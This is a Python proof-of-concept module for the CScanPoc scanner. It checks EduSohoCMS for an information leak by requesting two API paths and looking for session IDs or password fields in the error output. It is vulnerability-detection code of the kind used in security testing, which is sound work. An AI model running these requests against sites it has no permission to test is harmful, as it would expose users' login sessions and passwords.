# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'EduSohoCMS_0001' # 平台漏洞编号，留空
    name = 'EduSohoCMS 敏感信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2016-06-02'  # 漏洞公布时间
    desc = '''
        EduSohoCMS 两处敏感信息泄露。
        /api/users/1/followings
        /api/users/1/friendship?toIds[]=a
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/46292.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'EduSohoCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2ce455a9-c364-4238-8ece-5b06f1393404'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            poc1 = arg + '/api/users/1/followings'
            poc2 = arg + '/api/users/1/friendship?toIds[]=a'
            code, head, res1, errcode, _ = hh.http(poc1)
            code, head, res2, errcode, _ = hh.http(poc2)

            if code == 500:
                if "loginSessionId" in res1 or "'password' => '" in res2:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
